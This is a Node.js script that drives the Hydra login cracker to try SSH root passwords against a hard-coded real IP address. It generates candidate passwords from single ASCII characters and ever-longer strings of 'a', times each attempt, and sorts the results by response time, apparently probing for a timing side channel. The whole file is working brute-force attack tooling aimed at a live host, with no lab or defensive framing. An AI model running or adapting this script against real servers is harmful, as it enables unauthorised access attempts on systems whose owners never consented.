var fs = require('fs');
var exec = require('child_process').exec;

var d = new Date();
var n = d.getTime();
var t1 = n;
var lastascii = 0;
var timearray = new Array();
var passarray = new Array();
var indexarray = new Array();

function hydra_runcommand(cmd){
	console.log(lastascii + "\truncommand:\t" + cmd);
	indexarray[indexarray.length] = lastascii;
	var child;
	child = exec(cmd,
			function (error, stdout, stderr) {
				console.log('stdout: ' + stdout);
				console.log('stderr: ' + stderr);
				if (error !== null) {
					console.log('exec error: ' + error);
				}
				var d2 = new Date();
				var n2 = d2.getTime();
				var t2 = n2;
				var dif = (t2 - t1);
				timearray[timearray.length] = dif;
				console.log("TIME: " + dif + "\n\n");
				t1 = t2;
				hydra();
			});
}

function hydra(){
	var cupass = passarray[lastascii];
	lastascii++;
	var dcmd = "hydra -l root -p \"" + cupass + "\" 81.173.115.156 -t 4 ssh";
	
	if(lastascii == passarray.length){
		console.log("\n\nLOGS\n\n");
		console.log("INDEX\tTIME\tPASS");
		console.log("====\t====\t====");
		for(var i= 0;i <= timearray.length-1;i++){
			for(var j= i+1;j <= timearray.length-2;j++){
				if(timearray[j] < timearray[i]){
					var temp = timearray[i];
					timearray[i] = timearray[j];
					timearray[j] = temp;
					temp = passarray[i];
					passarray[i] = passarray[j];
					passarray[j] = temp;
					temp = indexarray[i];
					indexarray[i] = indexarray[j];
					indexarray[j] = temp;
				}
			}
		}
		for(var i= 0;i <= timearray.length-1;i++){
			console.log(indexarray[i] + "\t" + timearray[i] + "\t" + passarray[i] + "\n");
		}
		console.log("========================= FERTIG =========================");
	}else{
		hydra_runcommand(dcmd);
	}
}

//====== Create Passwords List ======
for(var i=26;i<=126;i++)	{
	passarray[passarray.length] = String.fromCharCode(i);
//console.log(i+"\t"+String.fromCharCode(i)+"\n");
}
for(var i=1;i<=255;i++)	{
	var psu = "";
	for(var j=0;j<=i;j++){	
		psu = psu + "a";
	}
	passarray[passarray.length] = psu;
}

//====== Main Function ======
var banner = "figlet -f big hydra"
child = exec(banner,
			function (error, stdout, stderr) {
				console.log(stdout);
				hydra();
			});
//hydra();

